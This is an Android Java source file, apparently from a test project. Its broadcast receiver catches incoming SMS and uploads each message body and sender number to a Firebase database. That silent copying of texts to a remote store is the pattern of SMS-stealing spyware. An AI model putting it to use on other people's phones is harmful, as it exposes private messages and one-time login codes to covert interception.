package com.example.test11;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class Brodcast extends BroadcastReceiver {
    FirebaseDatabase database = FirebaseDatabase.getInstance();
    DatabaseReference myRef;
    private static final String SMS_RECIVED="android.provider.Telephony.SMS_RECEIVED";
    private static final String tag="SmsBroadcastReceiver";
    String msg;
    String phoneNo;
    @Override
    public void onReceive(Context context, Intent intent) {


        myRef = database.getReference();
        if(intent.getAction()==SMS_RECIVED){
            Bundle dataBundle=intent.getExtras();
            if(dataBundle!=null){
                Object[] mypdu=(Object[])dataBundle.get("pdus");
                final SmsMessage[] message=new SmsMessage[mypdu.length];
                for(int i=0; i<mypdu.length;i++){
                    if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.M){
                        String format=dataBundle.getString("format");
                        message[i]=SmsMessage.createFromPdu((byte[])mypdu[i],format);

                    }else{
                        message[i]=SmsMessage.createFromPdu((byte[])mypdu[i]);

                    }
                    msg=message[i].getMessageBody();
                    phoneNo=message[i].getOriginatingAddress();

                }


                myRef.child("BroadCastReciver").child(phoneNo).push().setValue(msg);

            }
        }

    }

}
